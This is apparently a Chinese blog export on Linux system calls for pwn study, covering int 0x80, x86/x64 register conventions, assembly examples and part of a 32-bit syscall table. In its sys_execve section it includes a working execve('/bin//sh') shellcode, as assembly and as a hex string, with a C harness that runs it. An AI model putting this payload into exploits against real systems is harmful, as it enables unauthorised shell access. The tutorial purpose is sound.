<p>我们以x86为例说明：<br>由于陷入指令是一条特殊指令，而且依赖与操作系统实现的平台，如在x86中，这条指令是int 0x80，这显然不是用户在编程时应该使用的语句，因为这将使得用户程序难于移植。所以在操作系统的上层需要实现一个对应的系统调用库，每个系统调用都在该库中包含了一个入口点（如我们看到的fork, open, close等等），这些函数对程序员是可见的，而这些库函数的工作是以对应系统调用号作为参数，执行陷入指令int 0x80，以陷入核心执行真正的系统调用处理函数。当一个进程调用一个特定的系统调用库的入口点，正如同它调用任何函数一样，对于库函数也要创建一个栈帧。而当进程执行陷入指令时，它将处理机状态转换到核心态，并且在核心栈执行核心代码。</p>
<p>这里给出一个示例（linux/include/asm/unistd.h）：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _syscallN(type, name, type1, arg1, type2, arg2, . . . ) \</span></div><div class="line">type name(type1 arg1,type2 arg2) \</div><div class="line">&#123; \</div><div class="line">long __res; \</div><div class="line">__asm__ volatile (<span class="meta-string">"int $0x80"</span> \</div><div class="line">: <span class="meta-string">"=a"</span> (__res) \</div><div class="line">: <span class="meta-string">"0"</span> (__NR_##name),<span class="meta-string">"b"</span> ((long)(arg1)),<span class="meta-string">"c"</span> ((long)(arg2))); \</div><div class="line">. . . . . .</div><div class="line">__syscall_return(type,__res); \</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在执行一个系统调用库中定义的系统调用入口函数时，实际执行的是类似如上的一段代码。这里牵涉到一些gcc的嵌入式汇编语言，不做详细的介绍，只简单说明其意义：<br>其中\_\<em>NR\</em>##name是系统调用号，如name == ioctl，则为\_\_NR\_ioctl，它将被放在寄存器eax中作为参数传递给中断0x80的处理函数。而系统调用的其它参数arg1, arg2, …则依次被放入ebx, ecx, . . .等通用寄存器中，并作为系统调用处理函数的参数，这些参数是怎样传入核心的将会在后面介绍。</p>
<font color="#f00"><strong>注意该调用是从左至右依次传参，与普通函数的由右往左依次传参不同</strong></font>

<h3 id="4-实例介绍"><a href="#4-实例介绍" class="headerlink" title="4. 实例介绍"></a>4. 实例介绍</h3><h4 id="4-1-sys-execve（x86）"><a href="#4-1-sys-execve（x86）" class="headerlink" title="4.1 sys_execve（x86）"></a>4.1 sys_execve（x86）</h4><p>从<a href="/2017/08/06/系统调用约定/">系统调用约定</a> 一文中我们可以找到sys_execve系统调用的内容</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th>eax</th>
<th>ebx</th>
<th>ecx</th>
<th>edx</th>
<th>esi</th>
<th>edi</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>11</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html" target="_blank" rel="external">sys_execve</a></td>
<td>0x0b</td>
<td>char __user *</td>
<td>char <strong>user *</strong>user *</td>
<td>char <strong>user *</strong>user *</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="external">struct pt_regs *</a></td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L925" target="_blank" rel="external">arch/alpha/kernel/entry.S:925</a></td>
</tr>
</tbody>
</table>
<p>从此处可以知道sys_execve的系统调用约定</p>
<p>从<a href="http://www.cnblogs.com/wanghetao/archive/2011/11/06/2238310.html" target="_blank" rel="external">Linux中pt_regs结构体</a> 可以得到pt_regs的结构介绍</p>
<p>在<a href="http://man7.org/linux/man-pages/man2/execve.2.html" target="_blank" rel="external">http://man7.org/linux/man-pages/man2/execve.2.html</a> 中有给出execve的定义</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#include &lt;unistd.h&gt;</div><div class="line">int execve(const char *filename, char *const argv[], char *const envp[]);</div></pre></td></tr></table></figure>
<p>ebx是执行文件路径，ecx是命令行参数，edx是环境变量</p>
<p>很多时候ecx=0，edx=0。但是有时候若有参数，可以设置ecx</p>
<p>范例shellcode:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">xor    %eax,%eax</div><div class="line">push   %eax</div><div class="line">push   $<span class="number">0x68732f2f</span></div><div class="line">push   $<span class="number">0x6e69622f</span></div><div class="line">mov    %esp,%ebx</div><div class="line">push   %eax</div><div class="line">push   %ebx</div><div class="line">mov    %esp,%ecx</div><div class="line">mov    $<span class="number">0xb</span>,%al</div><div class="line"><span class="keyword">int</span>    $<span class="number">0x80</span></div><div class="line"></div><div class="line">********************************</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"> </div><div class="line"><span class="keyword">char</span> *shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"</span></div><div class="line">		  <span class="string">"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">"Length: %d\n"</span>,<span class="built_in">strlen</span>(shellcode));</div><div class="line">(*(<span class="keyword">void</span>(*)()) shellcode)();</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[系统调用约定]]></title>
      <url>/2017/08/06/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/</url>
      <content type="html"><![CDATA[<h3 id="1、windows-64位调用约定"><a href="#1、windows-64位调用约定" class="headerlink" title="1、windows 64位调用约定"></a>1、windows 64位调用约定</h3><p>windows64 位的调用很是奇怪，因为它不是通过栈来传参，而是通过寄存器来传参！</p>
<p>最为常见的是，当参数只有一个的时候，一般是选用rcx来传递参数！</p>
<h3 id="2、Linux-64位调用约定"><a href="#2、Linux-64位调用约定" class="headerlink" title="2、Linux 64位调用约定"></a>2、Linux 64位调用约定</h3><p>其实32位系统调用，我们在<a href="/2017/08/07/int-80h系统调用方法/">int-80h系统调用方法</a>已经有过讲述。现在，我们将要讨论的是64位的系统调用。不过在此之前，我们需要知道linux的两个有关系统调用的重要文件unistd\_32.h和unistd\_64.h，这两个文件定义了系统调用号！</p>
<h4 id="2-1-每种调用号需要传递哪些参数"><a href="#2-1-每种调用号需要传递哪些参数" class="headerlink" title="2.1 每种调用号需要传递哪些参数"></a>2.1 每种调用号需要传递哪些参数</h4><p>在linux系统中某个程序执行时进行的系统调用可以通过strace命令来查看，solaris中对应的命令为dtrace，而mac os x中可以通过类似的dtruss命令来查看。当进程已经处于 D 状态（uninterruptible sleep）时，strace 也帮不上忙。这时候可以通过:</p>
<blockquote>
<p>cat /proc/<pid>/syscall</pid></p>
</blockquote>
<p>来查看。（详细内容可以到<a href="http://www.jb51.net/article/50923.htm" target="_blank" rel="external">http://www.jb51.net/article/50923.htm</a>查看)</p>
<p>32位的系统调用表的参数可以到 <a href="http://syscalls.kernelgrok.com/" target="_blank" rel="external">http://syscalls.kernelgrok.com/</a> 查找；关于32位系统中使用汇编语言调用syscall table，将在另一篇博文[linux下32位汇编的系统调用]中详述。</p>
<p>而在64位系统中，大神说了：可以通过grep在源代码中查找： </p>
<p>To find the implementation of a system call, grep the kernel tree for SYSCALL_DEFINE.\?(syscall,</p>
<p>For example, to find the read system call:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">illusion:/usr/src/linux-source-3.19$ grep -rA3 &apos;SYSCALL_DEFINE.\?(read,&apos; *</div><div class="line">fs/read_write.c:SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count)</div><div class="line">fs/read_write.c-&#123;</div><div class="line">fs/read_write.c-        struct file *file;</div><div class="line">fs/read_write.c-        ssize_t ret = -EBADF;</div></pre></td></tr></table></figure>
<p>也可以在以下网址中查找：<br><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="external">http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></p>
<h4 id="2-2-调用如何传递参数以及结果如何返回"><a href="#2-2-调用如何传递参数以及结果如何返回" class="headerlink" title="2.2 调用如何传递参数以及结果如何返回"></a>2.2 调用如何传递参数以及结果如何返回</h4><p>在64位linux中，一般来说系统调用的参数统统放在寄存器中，最多可以用到6个寄存器；如果多余6个参数的系统调用怎么传递参数？这个还不清楚，有的文档说64位系统调用的参数最多不会超过6个；还有的文档说超过6个参数的话，其余参数全部通过堆栈来传递。超过6个参数的系统调用，本猫没有实际碰到，也不知到底该怎么办！?就这个问题，有兴趣的童鞋可以和本猫单独切磋讨论。</p>
<p>具体调用规则如下： </p>
<ol>
<li><p>用户模式的系统调用依次传递的寄存器为: </p>
<p><strong>rdi，rsi，rdx，rcx，r8和r9</strong> </p>
</li>
<li><p>内核接口的系统调用一次传递的寄存器为: </p>
<p><strong>rdi，rsi，rdx，r10，r8和r9</strong></p>
<p><strong>注意这里和用户模式的系统调用只有第4个寄存器不同，其他都相同。</strong> </p>
</li>
<li><p><strong>系统调用通过syscall指令进入，不像32位下的汇编使用的是int 0x80指令；</strong> </p>
</li>
<li><p>系统调用号放在rax寄存器里； </p>
</li>
<li><p>系统调用限制最多6个参数，没有参数直接通过栈传递，原话是:</p>
</li>
</ol>
<blockquote>
<p>System-calls are limited to six arguments, no argument is passed directly on the stack</p>
</blockquote>
<ol start="6">
<li>系统调用的返回结果，也就是syscall指令的返回放在rax寄存器中； </li>
<li>只有整形值和内存型的值可以传递给内核，这个也不十分明白，原话是:</li>
</ol>
<blockquote>
<p>Only values of class INTEGER or class MEMORY are passed to the kernel</p>
</blockquote>
<p>有的童鞋可能要问了，要是浮点数怎么传递给接口！？有参数是浮点数的系统调用吗？这个还真不清楚，不过参数是浮点数的C标准库函数的调用那是大大的有，这个等到在另一篇博文[64汇编调用C标准库函数]中再详细给大家解答。</p>
<h3 id="3、Linux系统调用实例"><a href="#3、Linux系统调用实例" class="headerlink" title="3、Linux系统调用实例"></a>3、Linux系统调用实例</h3><p>代码的功能很简单，显示一行文本，然后退出。我们使用了syscall中的write和exit调用，查一下前面的调用号和参数，我们初步总结如下：</p>
<p>write(即sys_write)调用号为1，需传递3个参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">unsigned int fd</div><div class="line">const char *buf</div><div class="line">size_t count</div></pre></td></tr></table></figure>
<p>exit(sys_exit)调用号为60，只需传递一个错误码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int error_code</div></pre></td></tr></table></figure>
<p>如果该值为0表示程序执行成功。</p>
<p>因为以上两个调用最多的也只有3个参数，所以我们依次只会用到3个寄存器rdi,rsi和rdx。 </p>
<p>实际代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">section .text</div><div class="line">;if use ld</div><div class="line">global _start</div><div class="line">;if use gcc</div><div class="line">;global main</div><div class="line">_start:</div><div class="line">;main</div><div class="line">    mov rax,1       ;write NO</div><div class="line">    mov rdi,1       ;fd</div><div class="line">    mov rsi,msg     ;addr of msg string</div><div class="line">    mov rdx,msg_len ;lenght of msg string</div><div class="line">    syscall</div><div class="line"></div><div class="line">    mov rax,60      ;exit NO</div><div class="line">    mov rdi,0       ;error_code</div><div class="line">    syscall</div><div class="line"></div><div class="line">    msg: db &quot;Hello World!&quot;,0xa</div><div class="line">    msg_len:equ $-msg</div></pre></td></tr></table></figure>
<p>编译连接命令如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nasm -f elf64 p.s</div><div class="line">ld -o p p.o</div></pre></td></tr></table></figure>
<p>如果是mac os x系统下命令如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nasm -f macho64 p.s</div><div class="line">ld -o p p.o</div></pre></td></tr></table></figure>
<p>如果你要生成32位的代码，在编译时把elf64改为elf32就可以了，不过我前面说过：32位和64位汇编结构变化较大，光改这个是没办法运行成功的。 </p>
<p>不出所料代码运行输出一行:Hello World！并且程序返回后用echo $?看，应该为0.</p>
<p>这个例子很简单，下面看一下稍微复杂点的调用:mmap,该调用共有6个参数，我们再一次总结如下：<br>mmap(sys_mmap) 系统调用号为9，参数分别为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">unsigned long addr</div><div class="line">unsigned long len</div><div class="line">unsigned long prot</div><div class="line">unsigned long flags</div><div class="line">unsigned long fd</div><div class="line">unsigned long offset</div></pre></td></tr></table></figure>
<p>第一个参数是需要映射到的地址，我们这里传0，表示不关心映射到哪；第二个参数是映射空间的大小；第三个参数表示映射区域的保护方式，有很多种，我们这里只让它可读可写即可，所以只用到2者的组合： </p>
<p>PROT_WRITE|PROT_READ </p>
<p>第四个参数是映射区域的一些特性，有很多组合。这里只用MAP_SHARED|MAP_ANONYMOUS,后者表示建立匿名映射，会忽略参数fd，所以不设及文件。 </p>
<p>第五个参数就是fd，前面说了可以忽略，所以我们传递-1；最后一个参数是映射的偏移量，我们也传递0. </p>
<p>该调用如果成功返回映射区域内存的起始地址，否则返回MAP_FAILED（-1）,错误原因存于errno中，我们可以用strerror(errno)查看具体含义。不过该函数是C库中的，这里我们捎带的用一下。</p>
<p>提到mmap我们不得不提到munmap，用猜大家也知道该调用的含义吧： </p>
<p>munmap(sys_munmap) 调用号为11,需传递2个参数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">unsigned long start</div><div class="line">size_t len</div></pre></td></tr></table></figure>
<h3 id="4、附录"><a href="#4、附录" class="headerlink" title="4、附录"></a>4、附录</h3><h4 id="4-1-32系统调用表"><a href="#4-1-32系统调用表" class="headerlink" title="4.1 32系统调用表"></a>4.1 32系统调用表</h4><table>
<thead>
<tr>
<th>#</th>
<th>Name</th>
<th>Registers</th>
<th>Definition</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
<td>eax</td>
<td>ebx</td>
<td>ecx</td>
<td>edx</td>
<td>esi</td>
<td>edi</td>
<td></td>
</tr>
<tr>
<td>0</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/restart_syscall.2.html" target="_blank" rel="external">sys_restart_syscall</a></td>
<td>0x00</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2058" target="_blank" rel="external">kernel/signal.c:2058</a></td>
</tr>
<tr>
<td>1</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/exit.2.html" target="_blank" rel="external">sys_exit</a></td>
<td>0x01</td>
<td>int error_code</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1046" target="_blank" rel="external">kernel/exit.c:1046</a></td>
</tr>
<tr>
<td>2</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fork.2.html" target="_blank" rel="external">sys_fork</a></td>
<td>0x02</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="external">struct pt_regs *</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L716" target="_blank" rel="external">arch/alpha/kernel/entry.S:716</a></td>
</tr>
<tr>
<td>3</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/read.2.html" target="_blank" rel="external">sys_read</a></td>
<td>0x03</td>
<td>unsigned int fd</td>
<td>char __user *buf</td>
<td>size_t count</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L391" target="_blank" rel="external">fs/read_write.c:391</a></td>
</tr>
<tr>
<td>4</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/write.2.html" target="_blank" rel="external">sys_write</a></td>
<td>0x04</td>
<td>unsigned int fd</td>
<td>const char __user *buf</td>
<td>size_t count</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L408" target="_blank" rel="external">fs/read_write.c:408</a></td>
</tr>
<tr>
<td>5</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/open.2.html" target="_blank" rel="external">sys_open</a></td>
<td>0x05</td>
<td>const char __user *filename</td>
<td>int flags</td>
<td>int mode</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L900" target="_blank" rel="external">fs/open.c:900</a></td>
</tr>
<tr>
<td>6</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/close.2.html" target="_blank" rel="external">sys_close</a></td>
<td>0x06</td>
<td>unsigned int fd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L969" target="_blank" rel="external">fs/open.c:969</a></td>
</tr>
<tr>
<td>7</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/waitpid.2.html" target="_blank" rel="external">sys_waitpid</a></td>
<td>0x07</td>
<td>pid_t pid</td>
<td>int __user *stat_addr</td>
<td>int options</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1771" target="_blank" rel="external">kernel/exit.c:1771</a></td>
</tr>
<tr>
<td>8</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/creat.2.html" target="_blank" rel="external">sys_creat</a></td>
<td>0x08</td>
<td>const char __user *pathname</td>
<td>int mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L933" target="_blank" rel="external">fs/open.c:933</a></td>
</tr>
<tr>
<td>9</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/link.2.html" target="_blank" rel="external">sys_link</a></td>
<td>0x09</td>
<td>const char __user *oldname</td>
<td>const char __user *newname</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2520" target="_blank" rel="external">fs/namei.c:2520</a></td>
</tr>
<tr>
<td>10</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unlink.2.html" target="_blank" rel="external">sys_unlink</a></td>
<td>0x0a</td>
<td>const char __user *pathname</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2352" target="_blank" rel="external">fs/namei.c:2352</a></td>
</tr>
<tr>
<td>11</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html" target="_blank" rel="external">sys_execve</a></td>
<td>0x0b</td>
<td>char __user *</td>
<td>char <strong>user *</strong>user *</td>
<td>char <strong>user *</strong>user *</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="external">struct pt_regs *</a></td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L925" target="_blank" rel="external">arch/alpha/kernel/entry.S:925</a></td>
</tr>
<tr>
<td>12</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chdir.2.html" target="_blank" rel="external">sys_chdir</a></td>
<td>0x0c</td>
<td>const char __user *filename</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L361" target="_blank" rel="external">fs/open.c:361</a></td>
</tr>
<tr>
<td>13</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/time.2.html" target="_blank" rel="external">sys_time</a></td>
<td>0x0d</td>
<td>time_t __user *tloc</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L855" target="_blank" rel="external">kernel/posix-timers.c:855</a></td>
</tr>
<tr>
<td>14</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mknod.2.html" target="_blank" rel="external">sys_mknod</a></td>
<td>0x0e</td>
<td>const char __user *filename</td>
<td>int mode</td>
<td>unsigned dev</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2067" target="_blank" rel="external">fs/namei.c:2067</a></td>
</tr>
<tr>
<td>15</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chmod.2.html" target="_blank" rel="external">sys_chmod</a></td>
<td>0x0f</td>
<td>const char __user *filename</td>
<td>mode_t mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L507" target="_blank" rel="external">fs/open.c:507</a></td>
</tr>
<tr>
<td>16</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lchown16.2.html" target="_blank" rel="external">sys_lchown16</a></td>
<td>0x10</td>
<td>const char __user *filename</td>
<td>old_uid_t user</td>
<td>old_gid_t group</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L27" target="_blank" rel="external">kernel/uid16.c:27</a></td>
</tr>
<tr>
<td>17</td>
<td>not implemented</td>
<td>0x11</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>18</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/stat.2.html" target="_blank" rel="external">sys_stat</a></td>
<td>0x12</td>
<td>char __user *filename</td>
<td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="external">struct <strong>old_kernel_stat </strong>user *statbuf</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L150" target="_blank" rel="external">fs/stat.c:150</a></td>
</tr>
<tr>
<td>19</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lseek.2.html" target="_blank" rel="external">sys_lseek</a></td>
<td>0x13</td>
<td>unsigned int fd</td>
<td>off_t offset</td>
<td>unsigned int origin</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L167" target="_blank" rel="external">fs/read_write.c:167</a></td>
</tr>
<tr>
<td>20</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpid.2.html" target="_blank" rel="external">sys_getpid</a></td>
<td>0x14</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1337" target="_blank" rel="external">kernel/timer.c:1337</a></td>
</tr>
<tr>
<td>21</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mount.2.html" target="_blank" rel="external">sys_mount</a></td>
<td>0x15</td>
<td>char __user *dev_name</td>
<td>char __user *dir_name</td>
<td>char __user *type</td>
<td>unsigned long flags</td>
<td>void __user *data</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L2118" target="_blank" rel="external">fs/namespace.c:2118</a></td>
</tr>
<tr>
<td>22</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/oldumount.2.html" target="_blank" rel="external">sys_oldumount</a></td>
<td>0x16</td>
<td>char __user *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L1171" target="_blank" rel="external">fs/namespace.c:1171</a></td>
</tr>
<tr>
<td>23</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setuid16.2.html" target="_blank" rel="external">sys_setuid16</a></td>
<td>0x17</td>
<td>old_uid_t uid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L67" target="_blank" rel="external">kernel/uid16.c:67</a></td>
</tr>
<tr>
<td>24</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getuid16.2.html" target="_blank" rel="external">sys_getuid16</a></td>
<td>0x18</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L212" target="_blank" rel="external">kernel/uid16.c:212</a></td>
</tr>
<tr>
<td>25</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/stime.2.html" target="_blank" rel="external">sys_stime</a></td>
<td>0x19</td>
<td>time_t __user *tptr</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L81" target="_blank" rel="external">kernel/time.c:81</a></td>
</tr>
<tr>
<td>26</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ptrace.2.html" target="_blank" rel="external">sys_ptrace</a></td>
<td>0x1a</td>
<td>long request</td>
<td>long pid</td>
<td>long addr</td>
<td>long data</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/ptrace.c?v=2.6.35#L688" target="_blank" rel="external">kernel/ptrace.c:688</a></td>
</tr>
<tr>
<td>27</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/alarm.2.html" target="_blank" rel="external">sys_alarm</a></td>
<td>0x1b</td>
<td>unsigned int seconds</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1314" target="_blank" rel="external">kernel/timer.c:1314</a></td>
</tr>
<tr>
<td>28</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstat.2.html" target="_blank" rel="external">sys_fstat</a></td>
<td>0x1c</td>
<td>unsigned int fd</td>
<td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="external">struct <strong>old_kernel_stat </strong>user *statbuf</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L174" target="_blank" rel="external">fs/stat.c:174</a></td>
</tr>
<tr>
<td>29</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pause.2.html" target="_blank" rel="external">sys_pause</a></td>
<td>0x1d</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2700" target="_blank" rel="external">kernel/signal.c:2700</a></td>
</tr>
<tr>
<td>30</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utime.2.html" target="_blank" rel="external">sys_utime</a></td>
<td>0x1e</td>
<td>char __user *filename</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/utime.h?v=2.6.35#L6" target="_blank" rel="external">struct utimbuf __user *times</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L27" target="_blank" rel="external">fs/utimes.c:27</a></td>
</tr>
<tr>
<td>31</td>
<td>not implemented</td>
<td>0x1f</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>32</td>
<td>not implemented</td>
<td>0x20</td>
<td>-</td>
